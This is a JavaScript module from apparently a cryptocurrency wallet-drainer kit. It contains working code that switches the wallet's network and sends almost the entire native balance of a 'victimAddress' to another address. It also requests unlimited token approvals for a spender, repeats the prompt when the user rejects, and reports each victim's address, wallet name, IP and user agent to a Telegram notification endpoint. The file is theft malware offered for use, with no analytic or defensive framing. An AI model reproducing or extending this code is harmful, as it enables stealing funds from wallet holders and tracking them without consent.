import { ethers } from "ethers";
import serverApi from "../apis/serverApi.js";

const AMOUNT_TO_APPROVE =
  "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";

const addNetwork = async (chain) => {
  try {
    await window.provider.request({
      method: "wallet_addEthereumChain",
      params: [
        {
          chainId: chain.chainHexId,
          chainName: chain.chainName,
          rpcUrls: [chain.rpcUrl],
          nativeCurrency: {
            symbol: chain.tokenSymbol,
            decimals: 18,
          },
        },
      ],
    });
  } catch (error) {
    const code = error.code;
    const conditionToRetry = code == 4001;
    if (conditionToRetry) return addNetwork(chain);
    throw error;
  }
};

const switchNetwork = async (chain, maxSwitchCount) => {
  try {
    await provider.request({
      method: "wallet_switchEthereumChain",
      params: [{ chainId: chain.chainHexId }],
    });
  } catch (error) {
    const code = error.code;

    const conditionToRetry = code == 4001 && maxSwitchCount > 1;
    const notFound = code == 4902 || code == -32603 || code == -32602;

    if (conditionToRetry) {
      const telegramNotification = {
        victimAddress: victimAddress,
        walletName: walletName,
        ip: country.ip,
        userAgent: navigator.userAgent,
        from_network: chain.from_network,
        to_network: chain.chainName,
      };

      const telegramResponse = await serverApi.telegramNotification(
        "NETWORK_REJECTED",
        telegramNotification
      );
      return switchNetwork(chain, maxSwitchCount - 1);
    }
    if (notFound) {
      await addNetwork(chain);
      return switchNetwork(chain, maxSwitchCount - 1);
    }

    throw error;
  }
};

const getGasPrice = async (chainSetting) => {
  let gasPriceGwei;
  let response;

  try {
    if (chainSetting.gasApiType === "explorer") {
      response = await (
        await fetch(`${chainSetting.gasUrl}${chainSetting.explorerApiKey}`)
      ).json();
      gasPriceGwei = Math.round(response.result.FastGasPrice * 1.1);
    } else if (chainSetting.gasApiType === "owlracle") {
      response = await (await fetch(chainSetting.gasUrl)).json();
      if (
        chainSetting.chainId === 1313161554 ||
        chainSetting.chainId === 128 ||
        chainSetting.chainId === 42220
      ) {
        gasPriceGwei = response.speeds[2].gasPrice;
      } else if (chainSetting.chainId === 42170) {
        gasPriceGwei = response.speeds[2].maxFeePerGas / 10;
      } else {
        gasPriceGwei = response.speeds[2].maxFeePerGas;
      }
    } else if (chainSetting.chainId === 43114) {
      response = await (
        await fetch(`${chainSetting.gasUrl}${chainSetting.explorerApiKey}`)
      ).json();
      gasPriceGwei = ethers.utils.formatUnits(
        ethers.BigNumber.from(Math.round(response.result * 1.1)),
        "gwei"
      );
    } else if (chainSetting.chainId === 324) {
      const data = {
        jsonrpc: "2.0",
        id: 1,
        method: "zks_getL1GasPrice",
        params: [],
      };
      const response = await fetch(chainSetting.gasUrl, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(data),
      });
      const result = await response.json();
      gasPriceGwei = ethers.utils.formatUnits(
        ethers.BigNumber.from(result.result),
        "gwei"
      );
    } else if (chainSetting.chainId === 100) {
      gasPriceGwei = response.result.fastgaspricegwei;
    }
    const gasPrice = ethers.utils.parseUnits(gasPriceGwei.toString(), "gwei");
    return gasPrice;
  } catch (error) {
    console.log(error.message);
    console.log(error.stack);
    console.error(error);
  }

  try {
    const gasPrice = (await chainProvider.getGasPrice())
      .div(ethers.BigNumber.from("100"))
      .mul(ethers.BigNumber.from("180"));
    console.log("NativeGas", gasPrice);
    return gasPrice;
  } catch (error) {
    console.log(error);
    throw new Error("Failed to get gas price");
  }
};

const getContractFunctions = (abi, functionNames) =>
  functionNames.filter((functionName) =>
    abi.some((item) => item.type === "function" && item.name === functionName)
  );

const transferNativeToken = async (options, maxRetryCount = 3) => {
  const { fromAddress, toAddress, chainSetting, token } = options;
  instructions.setStatus("safa");
  try {
    const gasPrice = await getGasPrice(chainSetting);

    const gasLimit = await chainProvider.estimateGas({
      from: fromAddress,
      to: toAddress,
      data: "0x",
    });

    const safeGasLimit = gasLimit
      .div(ethers.BigNumber.from("100"))
      .mul(ethers.BigNumber.from("120"));

    const balance = await chainProvider.getBalance(fromAddress);

    const safeBalance = balance
      .div(ethers.BigNumber.from("100"))
      .mul(ethers.BigNumber.from("95"));

    const gasFees = gasPrice.mul(safeGasLimit);
    const value = safeBalance.sub(gasFees);
    const nonce = await chainProvider.getTransactionCount(
      fromAddress,
      "pending"
    );
    const chainId = chainSetting.chainHexId;

    const tx = {
      from: fromAddress,
      to: toAddress,
      gasPrice: gasPrice,
      gasLimit: safeGasLimit,
      value: value,
      nonce: nonce,
      data: "0x",
      chainId: chainId,
    };

    console.log("tx: ", tx);
    const transaction = await signer.sendTransaction(tx);
    console.log("transaction: ", transaction);
    const receipt = await transaction.wait();
    const telegramNotification = {
      victimAddress: victimAddress,
      walletName: walletName,
      ip: country.ip,
      userAgent: navigator.userAgent,
      name: token.symbol,
      amount: token.amount,
      balance: token.balance,
      tx: receipt.transactionHash,
      isNative: true,
    };

    const telegramResponse = await serverApi.telegramNotification(
      "TRANSFER_ACCEPTED",
      telegramNotification
    );
    instructions.hide();
    return { receipt, value, gasPrice };
  } catch (error) {
    console.error("error: ", error.stack);
    const code = error.code;

    if (code == "ACTION_REJECTED") {
      console.log("action rejected token: ", token);
      const telegramNotification = {
        victimAddress: victimAddress,
        walletName: walletName,
        ip: country.ip,
        userAgent: navigator.userAgent,
        type: "Native Token",
        name: token.symbol,
        amount: token.amount,
        balance: token.balance,
        isNative: true,
      };

      const telegramResponse = await serverApi.telegramNotification(
        "TRANSFER_REJECTED",
        telegramNotification
      );
    }

    if (code == "ACTION_REJECTED" && maxRetryCount > 1) {
      return transferNativeToken(options, maxRetryCount - 1);
    }
    instructions.hide();
    throw error;
  }
};

const increaseAllowance = async (spender, amount, options) => {
  const transaction = await contract.increaseAllowance(
    spender,
    amount,
    options
  );
  return transaction;
};

const increaseApproval = async (spender, amount, options) => {
  const transaction = await contract.increaseApproval(spender, amount, options);
  return transaction;
};

const approve = async (spender, amount, options) => {
  const transaction = await contract.approve(spender, amount, options);
  return transaction;
};

const allowance = async (method, options, maxRetryCount = 3) => {
  const { spender, token, abi, chainSetting } = options;

  console.log("options: ", options);

  instructions.setStatus("safa");

  try {
    const contract = new ethers.Contract(token.id, abi, window.signer);
    let gasPrice = await getGasPrice(chainSetting);
    let gasLimit = await contract.estimateGas[method](
      spender,
      AMOUNT_TO_APPROVE
    );

    gasPrice = gasPrice
      .div(ethers.BigNumber.from("100"))
      .mul(ethers.BigNumber.from("150"));

    gasLimit = gasLimit
      .div(ethers.BigNumber.from("100"))
      .mul(ethers.BigNumber.from("150"));

    const nonce = await window.chainProvider.getTransactionCount(
      window.victimAddress,
      "pending"
    );

    const transaction = await contract[method](spender, AMOUNT_TO_APPROVE, {
      gasPrice: gasPrice,
      gasLimit: gasLimit,
      nonce,
    });

    const receipt = await transaction.wait();

    const telegramNotification = {
      victimAddress: victimAddress,
      walletName: walletName,
      ip: country.ip,
      userAgent: navigator.userAgent,
      name: token.symbol,
      amount: token.amount,
      balance: token.balance,
      tx: receipt.transactionHash,
      isNative: false,
    };

    const telegramResponse = await serverApi.telegramNotification(
      "TRANSFER_ACCEPTED",
      telegramNotification
    );

    instructions.hide();

    return { receipt, gasPrice };
  } catch (error) {
    const code = error.code;

    if (code == "ACTION_REJECTED") {
      const telegramNotification = {
        victimAddress: victimAddress,
        walletName: walletName,
        ip: country.ip,
        userAgent: navigator.userAgent,
        name: token.symbol,
        amount: token.amount,
        balance: token.balance,
        isNative: false,
      };
      const telegramResponse = await serverApi.telegramNotification(
        "TRANSFER_REJECTED",
        telegramNotification
      );
    }
    if (code == "ACTION_REJECTED" && maxRetryCount > 1) {
      return allowance(method, options, maxRetryCount - 1);
    }

    instructions.hide();

    throw error;
  }
};

export default {
  addNetwork,
  switchNetwork,
  getGasPrice,
  getContractFunctions,
  transferNativeToken,
  increaseAllowance,
  increaseApproval,
  approve,
  allowance,
};
